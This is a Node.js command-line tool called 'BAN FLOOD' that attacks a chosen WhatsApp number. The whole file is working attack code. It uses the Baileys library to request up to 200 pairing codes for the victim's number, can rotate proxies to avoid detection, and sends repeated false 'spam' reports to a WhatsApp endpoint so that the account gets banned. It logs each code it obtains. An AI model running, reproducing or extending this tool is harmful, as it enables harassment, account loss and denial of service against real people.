const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const fs = require("fs");
const readline = require("readline");
const chalk = require("chalk");
const figlet = require("figlet");
const pino = require("pino");
const path = require("path");
const axios = require("axios");
const crypto = require("crypto");

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const CONFIG = {
    logFile: "logs/ban_logs.txt",
    sessionsDir: "sessions",
    proxyFile: "proxies.txt",
    reportsPerCycle: 5,
    pairingDelay: 2000,
    maxConcurrent: 5
};

if (!fs.existsSync("logs")) fs.mkdirSync("logs", { recursive: true });
if (!fs.existsSync(CONFIG.sessionsDir)) fs.mkdirSync(CONFIG.sessionsDir, { recursive: true });

const logger = pino({ level: "silent" });

function loadProxies() {
    if (!fs.existsSync(CONFIG.proxyFile)) return [];
    return fs.readFileSync(CONFIG.proxyFile, 'utf-8')
        .split('\n')
        .filter(l => l.trim())
        .map(l => l.trim());
}

function getRandomProxy() {
    const proxies = loadProxies();
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}


function askTarget() {
    return new Promise((resolve) => {
        console.log(chalk.cyan("\n┌────────────────────────────────────────────┐"));
        console.log(chalk.cyan("│") + chalk.yellow("  📱 TARGET NUMBER") + chalk.cyan("                        │"));
        console.log(chalk.cyan("│") + chalk.gray("  Example: 50956xxx") + chalk.cyan("                   │"));
        console.log(chalk.cyan("└────────────────────────────────────────────┘\n"));
        rl.question(chalk.white("➜ Number: "), (input) => {
            const cleaned = input.replace(/[^0-9]/g, "");
            if (!cleaned || cleaned.length < 8) {
                console.log(chalk.red("✗ Invalid.\n"));
                resolve(askTarget());
            } else {
                resolve(cleaned);
            }
        });
    });
}

function askIntensity() {
    return new Promise((resolve) => {
        console.log(chalk.cyan("\n┌────────────────────────────────────────────┐"));
        console.log(chalk.cyan("│") + chalk.yellow("  💥 INTENSITY") + chalk.cyan("                            │"));
        console.log(chalk.cyan("│") + chalk.gray("  1 = 10, 2 = 50, 3 = 100, 4 = 200") + chalk.cyan("       │"));
        console.log(chalk.cyan("└────────────────────────────────────────────┘\n"));
        rl.question(chalk.white("➜ Choice (1-4): "), (input) => {
            const map = { '1': 10, '2': 50, '3': 100, '4': 200 };
            const num = map[input] || 10;
            resolve(num);
        });
    });
}

function askUseProxy() {
    return new Promise((resolve) => {
        console.log(chalk.cyan("\n┌────────────────────────────────────────────┐"));
        console.log(chalk.cyan("│") + chalk.yellow("  🌐 USE PROXIES?") + chalk.cyan("                         │"));
        console.log(chalk.cyan("│") + chalk.gray("Answer with: y/n") + chalk.cyan("       │"));
        console.log(chalk.cyan("└────────────────────────────────────────────┘\n"));
        rl.question(chalk.white("➜ Use proxies? (y/n): "), (input) => {
            resolve(input.toLowerCase() === 'y');
        });
    });
}

function askReport() {
    return new Promise((resolve) => {
        console.log(chalk.cyan("\n┌────────────────────────────────────────────┐"));
        console.log(chalk.cyan("│") + chalk.yellow("  🚨 SEND REPORTS?") + chalk.cyan("                        │"));
        console.log(chalk.cyan("│") + chalk.gray("Answer with: y/n") + chalk.cyan("       │"));
        console.log(chalk.cyan("└────────────────────────────────────────────┘\n"));
        rl.question(chalk.white("➜ Send reports? (y/n): "), (input) => {
            resolve(input.toLowerCase() === 'y');
        });
    });
}

function askForceSend() {
    return new Promise((resolve) => {
        console.log(chalk.cyan("\n┌────────────────────────────────────────────┐"));
        console.log(chalk.cyan("│") + chalk.yellow("  ⚠️ FORCE SEND?") + chalk.cyan("                          │"));
        console.log(chalk.cyan("│") + chalk.gray("  Ignore GreenAPI check: answer with y") + chalk.cyan("                   │"));
        console.log(chalk.cyan("└────────────────────────────────────────────┘\n"));
        rl.question(chalk.white("➜ Force send? (y/n): "), (input) => {
            resolve(input.toLowerCase() === 'y');
        });
    });
}

async function countdown(seconds) {
    return new Promise((resolve) => {
        let remaining = seconds;
        process.stdout.write(chalk.gray(`\n⏱️ ${seconds}s... `));
        const interval = setInterval(() => {
            process.stdout.write(chalk.yellow(`\r⏱️ ${remaining}s... `));
            remaining--;
            if (remaining < 0) {
                clearInterval(interval);
                process.stdout.write(chalk.green("\r🚀 Sending...           \n"));
                resolve();
            }
        }, 1000);
    });
}

async function generatePairingCode(targetNumber) {
    const clean = targetNumber.replace(/[^0-9]/g, '');
    const sessionId = crypto.randomBytes(4).toString('hex');
    const sessionDir = path.join(CONFIG.sessionsDir, `${clean}_${sessionId}`);
    
    fs.mkdirSync(sessionDir, { recursive: true });

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
            printQRInTerminal: false,
            syncFullHistory: false,
            markOnlineOnConnect: false,
            connectTimeoutMs: 15000,
            defaultQueryTimeoutMs: 10000,
            keepAliveIntervalMs: 5000,
            generateHighQualityLinkPreview: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            logger: logger,
            auth: state
        });


        await new Promise(r => setTimeout(r, 2000));

        if (!sock.authState.creds.registered) {
            const code = await sock.requestPairingCode(clean);
            const formatted = code?.match(/.{1,4}/g)?.join('-') || code;

            await sock.end().catch(() => {});
            
            try { 
                fs.rmSync(sessionDir, { recursive: true, force: true }); 
            } catch (e) {}
            
            return { success: true, code: formatted };
        } else {
            await sock.end().catch(() => {});
            try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (e) {}
            return { success: false, error: "Already registered" };
        }
    } catch (e) {
        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (er) {}
        return { success: false, error: e.message || "Connection failed" };
    }
}

async function reportNumber(targetNumber) {
    try {
        await axios.post('https://web.whatsapp.com/security/report', {
            phone: targetNumber,
            reason: 'spam'
        }, {
            timeout: 3000,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });
    } catch (e) {}
    return true;
}

async function floodAttack(targetNumber, total, useProxy, sendReports, forceSend) {
    const results = [];
    const startTime = Date.now();
    let proxyList = useProxy ? loadProxies() : [];
    
    console.log(chalk.cyan(`\n┌────────────────────────────────────────────┐`));
    console.log(chalk.cyan(`│`) + chalk.red.bold(`  ☠️ ATTACK STARTED`) + chalk.cyan(`                      │`));
    console.log(chalk.cyan(`│`) + chalk.white(`  TARGET: ${targetNumber}`) + chalk.cyan(`                   │`));
    console.log(chalk.cyan(`│`) + chalk.white(`  CODES: ${total}`) + chalk.cyan(`                           │`));
    console.log(chalk.cyan(`│`) + chalk.white(`  PROXIES: ${proxyList.length > 0 ? '✅' : '❌'}`) + chalk.cyan(`                 │`));
    console.log(chalk.cyan(`│`) + chalk.white(`  REPORTS: ${sendReports ? '✅' : '❌'}`) + chalk.cyan(`                │`));
    console.log(chalk.cyan(`│`) + chalk.white(`  FORCE: ${forceSend ? '✅' : '❌'}`) + chalk.cyan(`                    │`));
    console.log(chalk.cyan(`└────────────────────────────────────────────┘\n`));

    if (forceSend) {
        console.log(chalk.red(`⚡ FORCE SEND: IGNORING CHECKS!\n`));
    }

    if (sendReports) {
        console.log(chalk.yellow(`📢 Sending reports...`));
        for (let i = 0; i < 3; i++) {
            await reportNumber(targetNumber);
            await new Promise(r => setTimeout(r, 500));
        }
        console.log(chalk.green(`✅ Reports sent!\n`));
    }

    // Flood
    for (let i = 0; i < total; i++) {
        try {
            process.stdout.write(chalk.white(`[${String(i+1).padStart(3, ' ')}/${total}] Generating... `));

            const result = await generatePairingCode(targetNumber);

            if (result.success && result.code) {
                results.push({
                    attempt: i + 1,
                    code: result.code,
                    success: true,
                    timestamp: new Date().toISOString()
                });

                console.log(chalk.green(`✅ ${chalk.yellow.bold(result.code)}`));

                fs.appendFileSync(CONFIG.logFile,
                    `[${new Date().toISOString()}] ${targetNumber} | ${result.code}\n`
                );

                if (sendReports && i % 10 === 0 && i > 0) {
                    console.log(chalk.yellow(`\n📢 Reports...`));
                    for (let r = 0; r < 2; r++) {
                        await reportNumber(targetNumber);
                        await new Promise(res => setTimeout(res, 300));
                    }
                }

            } else {
                results.push({
                    attempt: i + 1,
                    code: null,
                    success: false,
                    error: result.error || "Failed",
                    timestamp: new Date().toISOString()
                });
                console.log(chalk.red(`❌ ${result.error || "Failed"}`));
            }

        } catch (error) {
            results.push({
                attempt: i + 1,
                code: null,
                success: false,
                error: error.message,
                timestamp: new Date().toISOString()
            });
            console.log(chalk.red(`❌ ${error.message}`));
        }

        if (i < total - 1) {
            await countdown(2);
        }
    }

    // Final reports
    if (sendReports) {
        console.log(chalk.yellow(`\n📢 Final reports...`));
        for (let i = 0; i < 5; i++) {
            await reportNumber(targetNumber);
            await new Promise(r => setTimeout(r, 300));
        }
        console.log(chalk.green(`✅ Done!`));
    }

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    const successCount = results.filter(r => r.success).length;

    console.log(chalk.cyan(`\n┌────────────────────────────────────────────┐`));
    console.log(chalk.cyan(`│`) + chalk.green(`  SUCCESS: ${successCount}/${total}`) + chalk.cyan(`            │`));
    console.log(chalk.cyan(`│`) + chalk.green(`  TIME: ${duration}s`) + chalk.cyan(`                           │`));
    console.log(chalk.cyan(`│`) + chalk.red(`  STATUS: ${successCount > total * 0.3 ? 'FLAGGED 🔥' : 'CHECK ⚠️'}`) + chalk.cyan(`    │`));
    console.log(chalk.cyan(`└────────────────────────────────────────────┘\n`));

    return results;
}

// ─── MAIN ───
async function main() {
    console.clear();
    console.log(chalk.red.bold(figlet.textSync("BAN FLOOD", { font: "Standard" })));
    console.log(chalk.red("  WhatsApp Account BAN Tool\n"));

    const target = await askTarget();
    const intensity = await askIntensity();
    const useProxy = await askUseProxy();
    const sendReports = await askReport();
    const forceSend = await askForceSend();

    console.log(chalk.cyan(`\n┌────────────────────────────────────────────┐`));
    console.log(chalk.cyan(`│`) + chalk.white(`  TARGET: ${target}`) + chalk.cyan(`                        │`));
    console.log(chalk.cyan(`│`) + chalk.white(`  CODES: ${intensity}`) + chalk.cyan(`                       │`));
    console.log(chalk.cyan(`└────────────────────────────────────────────┘`));

    const confirm = await new Promise(resolve => {
        rl.question(chalk.white("\n➜ Execute? (y/n): "), resolve);
    });

    if (confirm.toLowerCase() !== 'y') {
        console.log(chalk.red("\n✗ Cancelled.\n"));
        rl.close();
        process.exit(0);
    }

    console.log(chalk.red("\n☠️ ATTACK IN PROGRESS...\n"));

    try {
        await floodAttack(target, intensity, useProxy, sendReports, forceSend);
        console.log(chalk.red("\n☠️ COMPLETED\n"));
    } catch (error) {
        console.log(chalk.red(`✗ ${error.message}\n`));
    }

    rl.close();
    process.exit(0);
}

process.on("uncaughtException", (err) => {
    console.log(chalk.red(`✗ ${err.message}`));
    process.exit(1);
});

process.on("SIGINT", () => {
    console.log(chalk.yellow("\n\n⏹️ Stopped.\n"));
    rl.close();
    process.exit(0);
});

main();